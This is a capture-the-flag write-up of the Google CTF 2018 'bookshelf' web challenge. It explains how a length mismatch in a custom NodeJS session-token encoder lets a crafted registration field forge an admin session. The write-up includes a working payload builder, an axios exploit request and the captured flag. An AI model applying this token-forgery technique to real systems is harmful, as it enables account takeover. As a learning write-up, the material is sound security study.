```  
Organize those rectangular things that take physical space!

https://books.web.ctfcompetition.com/

[Attachment]  
```

Downloaded the attachment. Surprise, the code is in there for the books CMS. I
don't have to blackbox it.

NodeJS. Beautiful.

Started looking through the code. Sniffing for anything out of place.  
```json  
{  
  "dependencies": {  
   "@google-cloud/datastore": "1.3.4",  
   "@google-cloud/storage": "1.6.0",  
   "body-parser": "1.18.2",  
   "express": "4.16.2",  
   "lodash": "4.17.5",  
   "mongodb": "3.0.2",  
   "multer": "1.3.0",  
   "mysql": "2.15.0",  
   "nconf": "0.10.0",  
   "prompt": "1.0.0",  
   "pug": "2.0.0-rc.4",  
   "uglify-js": "3.3.12",  
   "cookie-parser": "latest",  
   "uuid": "latest"  
 },  
}  
```

My guess is that there is nothing I can do about the google-cloud storage and
datastore. They won't expose a vulnerability for this challenge on their main
server, so uploading a php shell (2000's h4x0r style) is out of the question.

The fact that the versions are fixed raises a question mark. but they're the
latest, so moving on.

Enter `./app.js`  
We have  
```javascript  
app.use('/books', require('./books/crud'));  
app.use('/user', require('./books/user'));  
```

but nothing much else. Moving on through the files.

`books/api.js` -- found out the hard way it's not actually used. Maybe
something changed and they forgot it here.

`books/crud.js` -- crud operations on books

`books/user.js` -- well here it gets interesting

```javascript  
let data = req.body;

let u = await userModel.get(h(data.name));

if (u) {  
   res.status(400).send('User exists.');  
   return;  
}

if (req.file && req.file.cloudStoragePublicUrl) {  
 data.image = req.file.cloudStoragePublicUrl;  
}

if (data.name === 'admin') {  
   res.status(503).send('Nope!');  
   return;  
}

data.age = data.age | 0;

if (data.age < 18) {  
   res.status(503).send('You are too young!');  
   return;  
}

data.password = h(data.password);

userModel.update(h(data.name), data, () => {  
   res.redirect('/');  
});  
```

Particularly when he says I can't register as an `admin`. BUT MOOOOOM!!!. Well
you can't. That's the *First Clue*. I gotta have it.

Looking through `lib` directory I found  
- lib/auth.js  
- lib/bwt.js  
- lib/images.js

Analyzed `auth.js`. Seems that if you login, there's a middleware that creates
your session cookie. And it's a BWT. Kinda like a young cousin of JWT that
looks at the world with hope. Well that's a clue. The Second Clue. Why not
just use JWT my dudes? Because that would make the challenge impossible.
maybe. i guess.

Soo. `bwt.js`

```javascript  
'strict';

const crypto = require('crypto');

function pint(n) {  
   let b = new Buffer(4)  
   b.writeInt32LE(n)  
   return b  
}

function encode(o, KEY) {  
   let b = new Buffer(0)

   for (let k in o) {  
       let v = o[k]

       b = Buffer.concat([b, pint(k.length), Buffer.from(k)])

       switch(typeof v) {  
           case "string":  
               b = Buffer.concat([b, Buffer.from([1]), pint(Buffer.byteLength(v)), Buffer.from(v.toLowerCase())])  
               break  
           case 'number':  
               b = Buffer.concat([b, Buffer.from([2]), pint(v)])  
               break  
           default:  
               b = Buffer.concat([b, Buffer.from([0])])  
               break  
       }  
   }

   b = b.toString('base64')

   const hmac = crypto.createHmac('sha256', KEY)  
   hmac.update(b)  
   let s = hmac.digest('base64')

   return b + '.' + s  
}

function decode(payload, KEY) {  
   let [b, s] = payload.split('.')

   const hmac = crypto.createHmac('sha256', KEY)  
   hmac.update(b)  
   if (s !== hmac.digest('base64')) {  
       return null;  
   }

   let o = {}  
   let i = 0  
   b = new Buffer(b, 'base64')

   while (i < b.length) {  
       n = b.readUInt32LE(i), i += 4  
       k = b.toString('utf8', i, i+n), i += n  
       t = b.readUInt8(i), i += 1

       switch(t) {  
           case 1:  
               n = b.readUInt32LE(i), i += 4  
               v = b.toString('utf8', i, i+n), i += n  
               o[k] = v  
               break  
           case 2:  
               n = b.readUInt32LE(i), i += 4  
               o[k] = n  
               break  
           default:  
               break  
       }  
   }  
   return o  
}

module.exports = function(key) {  
   return {  
       encode: (o) => encode(o, key),  
       decode: (p) => decode(p, key)  
   }  
}  
```

I looked really deep into it's easy. But couldn't see anything. How do you
break the key?! You don't... Maybe HMAC? Nope.

Looking around the site I noticed that if I login multiple times, the keys
scramble around in the session.

```  
< set-cookie:
auth=BAAAAG5hbWUBCQAAAG55dHIwZ2VuMQgAAABwYXNzd29yZAFAAAAANjVlODRiZTMzNTMyZmI3ODRjNDgxMjk2NzVmOWVmZjNhNjgyYjI3MTY4YzBlYTc0NGIyY2Y1OGVlMDIzMzdjNQMAAABhZ2UCFAAAAAQAAABkZXNjAQQAAAAxMjM3AgAAAGlkAUAAAABhYzM5NGQ0MjNiNDI1NGU0ZGI3MTVlMGUzNDRhODBlZjU5ODE4MTQzNzkxNzBiMWMxNzE5MDU0NWYwZWNiZjdj.YBcJKLB6va%2BHpADFIIfxssCuUqeKnp9v2evfPOgSnCM%3D;
Path=/

\u0004\u0000\u0000\u0000name\u0001\u0009\u0000\u0000\u0000nytr0gen1\u0008\u0000\u0000\u0000password\u0001@\u0000\u0000\u000065e84be33532fb784c48129675f9eff3a682b27168c0ea744b2cf58ee02337c5\u0003\u0000\u0000\u0000age\u0002\u0014\u0000\u0000\u0000\u0004\u0000\u0000\u0000desc\u0001\u0004\u0000\u0000\u00001237\u0002\u0000\u0000\u0000id\u0001@\u0000\u0000\u0000ac394d423b4254e4db715e0e344a80ef5981814379170b1c17190545f0ecbf7c

< set-cookie:
auth=BAAAAGRlc2MBBAAAADEyMzcEAAAAbmFtZQEJAAAAbnl0cjBnZW4xCAAAAHBhc3N3b3JkAUAAAAA2NWU4NGJlMzM1MzJmYjc4NGM0ODEyOTY3NWY5ZWZmM2E2ODJiMjcxNjhjMGVhNzQ0YjJjZjU4ZWUwMjMzN2M1AwAAAGFnZQIUAAAAAgAAAGlkAUAAAABhYzM5NGQ0MjNiNDI1NGU0ZGI3MTVlMGUzNDRhODBlZjU5ODE4MTQzNzkxNzBiMWMxNzE5MDU0NWYwZWNiZjdj.03lJdjbM2jI3z4P458fD5%2FdTb97bEvoXAOHaAUI5Ohs%3D;
Path=/

\u0004\u0000\u0000\u0000desc\u0001\u0004\u0000\u0000\u00001237\u0004\u0000\u0000\u0000name\u0001\u0009\u0000\u0000\u0000nytr0gen1\u0008\u0000\u0000\u0000password\u0001@\u0000\u0000\u000065e84be33532fb784c48129675f9eff3a682b27168c0ea744b2cf58ee02337c5\u0003\u0000\u0000\u0000age\u0002\u0014\u0000\u0000\u0000\u0002\u0000\u0000\u0000id\u0001@\u0000\u0000\u0000ac394d423b4254e4db715e0e344a80ef5981814379170b1c17190545f0ecbf7c

< set-cookie:
auth=CAAAAHBhc3N3b3JkAUAAAAA2NWU4NGJlMzM1MzJmYjc4NGM0ODEyOTY3NWY5ZWZmM2E2ODJiMjcxNjhjMGVhNzQ0YjJjZjU4ZWUwMjMzN2M1AwAAAGFnZQIUAAAABAAAAGRlc2MBBAAAADEyMzcEAAAAbmFtZQEJAAAAbnl0cjBnZW4xAgAAAGlkAUAAAABhYzM5NGQ0MjNiNDI1NGU0ZGI3MTVlMGUzNDRhODBlZjU5ODE4MTQzNzkxNzBiMWMxNzE5MDU0NWYwZWNiZjdj.3VHfeHTFDGEr7tHcFj3%2By8DoAGZRxyqlXlFygJDfg40%3D;
Path=/

\u0008\u0000\u0000\u0000password\u0001@\u0000\u0000\u000065e84be33532fb784c48129675f9eff3a682b27168c0ea744b2cf58ee02337c5\u0003\u0000\u0000\u0000age\u0002\u0014\u0000\u0000\u0000\u0004\u0000\u0000\u0000desc\u0001\u0004\u0000\u0000\u00001237\u0004\u0000\u0000\u0000name\u0001\u0009\u0000\u0000\u0000nytr0gen1\u0002\u0000\u0000\u0000id\u0001@\u0000\u0000\u0000ac394d423b4254e4db715e0e344a80ef5981814379170b1c17190545f0ecbf7c  
```

kinda like this. well I got this idea. While eating some nutella with
pancakes. that maybe, maybe I can get a combination on login that could put
`desc` the last. And with that I can write some magical stuff and overwrite
the `id`. Which seems to be the last one always. You can check `curl-login.sh`
for repeated SPAAM.

Well the idea seems valid. I gotta be admin right?! But going back to `bwt.js`
my idea is smashed into little pieces because he takes `length` into account.

```javascript  
// k is for key  
// v is for value  
b = Buffer.concat([b, pint(k.length), Buffer.from(k)])  
switch(typeof v) {  
   case "string":  
       b = Buffer.concat([b, Buffer.from([1]), pint(Buffer.byteLength(v)), Buffer.from(v.toLowerCase())])  
       break  
   case 'number':  
       b = Buffer.concat([b, Buffer.from([2]), pint(v)])  
       break  
   default:  
       b = Buffer.concat([b, Buffer.from([0])])  
       break  
```

but wait. what is that `Buffer.byteLength(v)`. It seems you use that for utf8.
There's a neat example on [nodejs
docs](https://nodejs.org/api/buffer.html#buffer_class_method_buffer_bytelength_string_encoding).
`// Prints: ½ + ¼ = ¾: 9 characters, 12 bytes` Omg that's exactly what I need.
And would you look at that, the key uses `.length` and only the value is
encoded with `byteLength`. BIG CLUE. What if we insert some multibyte chars,
so it decodes before the key ends. But can we?! I remembered something strange
I saw earlier.

In `views/user/reg.pug` there's a field called `desc`. But there is no `desc`
field in `books/user.js`. How can that be?! Well I gotta check the model.
Modern Advanced 31337 Corporate Frameworks check fields and validate in there.

We're looking for `userModel.update`  
```javascript  
function toDatastore (obj, nonIndexed) {  
 nonIndexed = nonIndexed || [];  
 let results = [];  
 Object.keys(obj).forEach((k) => {  
   if (obj[k] === undefined) {  
     return;  
   }  
   results.push({  
     name: k,  
     value: obj[k],  
     excludeFromIndexes: nonIndexed.indexOf(k) !== -1  
   });  
 });  
 return results;  
}

function update (id, data, cb) {  
 let key;  
 if (id) {  
   key = ds.key([kind, id.toString()]);  
 } else {  
   key = ds.key(kind);  
 }

 const entity = {  
   key: key,  
   data: toDatastore(data)  
 };

 ds.save(  
   entity,  
   (err) => {  
data.id = entity.key.name;  
     cb(err, err ? null : data);  
   }  
 );  
}  
```

NO WAY MAN. everything I send to that register is stored in the db.

SO I can manufacture a special key, which decodes into the object I want. Can
I overwrite the id? Hell yeah. If I just make the decoder somehow comment out
the id, I'm gold.

From here I just had to understand how the encoder `lib/bwt.js` moves the bits
around. And then I created a register payload.

At this point I got so fluent in BWT code that I didn't code anything to spill
out bwt code for me. It was like second nature. I created `bwt-payload.js` to
test my wild theories, which is basically a `lib/bwt.js` without the hmac.  
```javascript  
'strict';

const crypto = require('crypto');

function pint(n) {  
   let b = new Buffer(4)  
   b.writeInt32LE(n)  
   return b  
}

function encode(o) {  
   let b = new Buffer(0)

   for (let k in o) {  
       let v = o[k]

       b = Buffer.concat([b, pint(k.length), Buffer.from(k)])

       switch(typeof v) {  
       case "string":  
           b = Buffer.concat([b, Buffer.from([1]), pint(Buffer.byteLength(v)), Buffer.from(v.toLowerCase())])  
           break  
       case 'number':  
           b = Buffer.concat([b, Buffer.from([2]), pint(v)])  
           break  
       default:  
           b = Buffer.concat([b, Buffer.from([0])])  
           break  
       }  
   }

   b = b.toString('base64')

   return b  
}

function decode(b) {  
   let o = {}  
   let i = 0  
   b = new Buffer(b, 'base64')

   while (i < b.length) {  
       n = b.readUInt32LE(i), i += 4  
       k = b.toString('utf8', i, i+n), i += n  
       t = b.readUInt8(i), i += 1

       console.log(k, n);

       switch(t) {  
       case 1:  
           n = b.readUInt32LE(i), i += 4  
           v = b.toString('utf8', i, i+n), i += n  
           o[k] = v  
           break  
       case 2:  
           n = b.readUInt32LE(i), i += 4  
           o[k] = n  
           break  
       default:  
           break  
       }  
   }  
   return o  
}

// encode non printable  
var encodeNP = function(s){  
   var hex, c;  
   var result = '';  
   for (var i = 0; i < s.length; i++) {  
       c = s[i];  
       if (c >= 32 && c <= 126) {  
           result += String.fromCharCode(c);  
       } else {  
           hex = c.toString(16);  
           result += '\\u' + ('000'+hex).slice(-4);  
       }  
   }

   return result;  
}

const payload = {  
   'name': 'nytr0gen31337',  
   'age': 20,  
   'desc': 13,  
   "zzzz\u00bd\u00bd\u00bd\u00bd\u00bd\u0001\u0005\u0000\u0000\u0000":
"\u0004\u0000\u0000\u0000name\u0001\u0005\u0000\u0000\u0000admin" +  
       "\u0002\u0000\u0000\u0000id\u0001@\u0000\u0000\u00008c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918" +  
       "\u0008\u0000\u0000\u0000password\u0001@\u0000\u0000\u000065e84be33532fb784c48129675f9eff3a682b27168c0ea744b2cf58ee02337c5" +  
       "\u0002\u0000\u0000\u0000pl\u0001\u00ff\u00ff\u0000\u0000",  
   'password':
'65e84be33532fb784c48129675f9eff3a682b27168c0ea744b2cf58ee02337c5',  
   'id': 'deadbeefb5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918'  
};  
console.log(payload);  
const plm = encode(payload);  
console.log(plm);  
console.log(encodeNP(new Buffer(plm, 'base64')));  
console.log(decode(plm));  
```

```javascript  
// PAYLOAD BEFORE ENCODING  
{  
   'name': 'nytr0gen31337',  
   'age': 20,  
   'desc': 13,  
   "zzzz\u00bd\u00bd\u00bd\u00bd\u00bd\u0001\u0005\u0000\u0000\u0000":
"\u0004\u0000\u0000\u0000name\u0001\u0005\u0000\u0000\u0000admin" +  
       "\u0002\u0000\u0000\u0000id\u0001@\u0000\u0000\u00008c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918" +  
       "\u0008\u0000\u0000\u0000password\u0001@\u0000\u0000\u000065e84be33532fb784c48129675f9eff3a682b27168c0ea744b2cf58ee02337c5" +  
       "\u0002\u0000\u0000\u0000pl\u0001\u00ff\u00ff\u0000\u0000",  
   'password':
'65e84be33532fb784c48129675f9eff3a682b27168c0ea744b2cf58ee02337c5',  
   'id': 'deadbeefb5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918'  
}  
```

What interests us is this part  
```  
"zzzz\u00bd\u00bd\u00bd\u00bd\u00bd\u0001\u0005\u0000\u0000\u0000":  
   "\u0004\u0000\u0000\u0000name\u0001\u0005\u0000\u0000\u0000admin" +  
"\u0002\u0000\u0000\u0000id\u0001@\u0000\u0000\u00008c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918"
+  
"\u0008\u0000\u0000\u0000password\u0001@\u0000\u0000\u000065e84be33532fb784c48129675f9eff3a682b27168c0ea744b2cf58ee02337c5"
+  
   "\u0002\u0000\u0000\u0000pl\u0001\u00ff\u00ff\u0000\u0000",  
```

So we have `4*z`, `5*\u00bd` and `\u0001\u0005\u0000\u0000\u0000`. This helps
us skip 5 magic header bits from the key. Specifically
`\u0001\u00bb\u0000\u0000\u0000`. So everything in the value part gets decoded
as new keys.

name. `\u0004\u0000\u0000\u0000name\u0001\u0005\u0000\u0000\u0000admin` admin
yeah

id.
`\u0002\u0000\u0000\u0000id\u0001@\u0000\u0000\u00008c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918`.
sha256('admin')

password.
`\u0008\u0000\u0000\u0000password\u0001@\u0000\u0000\u000065e84be33532fb784c48129675f9eff3a682b27168c0ea744b2cf58ee02337c5`.
sha256('qwerty')

As you have seen before, id is always put last when creating the session
cookie. We have to make the decoder skip it, because it will overwrite our id.
bad.

`\u0002\u0000\u0000\u0000pl\u0001\u00ff\u00ff\u0000\u0000`. this does exactly
that. under the key `pl` with a length of `\u00ff\u00ff\u0000\u0000 == 65535`.
It seems that if I tried a length lesser than what was after it, the script
will fail miserably. But anything bigger is cool.

What does it look like after decoding?

```javascript  
// ENCODED_PAYLOAD AFTER DECODING  
{ name: 'admin',  
 age: 20,  
 desc: 13,  
 'zzzz½½½½½': '\u0001\u00bb\u0000\u0000\u0000',  
 id:  
  '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918',  
 password:  
  '65e84be33532fb784c48129675f9eff3a682b27168c0ea744b2cf58ee02337c5',  
 pl:  
'\u0000\u0000\b\u0000\u0000\u0000password\u0001@\u0000\u0000\u000065e84be33532fb784c48129675f9eff3a682b27168c0ea744b2cf58ee02337c5\u0002\u0000\u0000\u0000id\u0001@\u0000\u0000\u0000deadbeefb5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918'
}  
```

We're IN! now i just have to register with that payload.

```javascript  
// Requires NodeJs  
// and `npm install axios`  
const axios = require('axios');  
const querystring = require('querystring');

axios({  
   method: 'post',  
   url: `https://books.web.ctfcompetition.com/user/register`,  
   headers: {  
       referer: 'https://books.web.ctfcompetition.com/user/register',  
       'Content-Type': 'application/x-www-form-urlencoded',  
   },  
   data: querystring.stringify({  
       'name': 'nytr0gen31337',  
       'age': 20,  
       'desc': 13,  
       "zzzz\u00bd\u00bd\u00bd\u00bd\u00bd\u0001\u0005\u0000\u0000\u0000": "\u0004\u0000\u0000\u0000name\u0001\u0005\u0000\u0000\u0000admin" +  
       "\u0002\u0000\u0000\u0000id\u0001@\u0000\u0000\u00008c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918" +  
       "\u0008\u0000\u0000\u0000password\u0001@\u0000\u0000\u000065e84be33532fb784c48129675f9eff3a682b27168c0ea744b2cf58ee02337c5" +  
       "\u0002\u0000\u0000\u0000pl\u0001\u00ff\u00ff\u0000\u0000",  
       'password': 'qwerty',  
   }),  
}).then((response) => {  
   console.log(response.data);  
}).catch((err) => {  
   console.error(err);  
});  
```

login as `nytr0gen31337` and we're finished, go to my books.

```  
CTF{1892b0d8bc93d7e4ca98975f47f8c7d8}  
```

that look like an md5. what's in there?  

Original writeup (https://github.com/nytr0gen/google-ctf-2018-quals-
writeups/tree/master/bookshelf).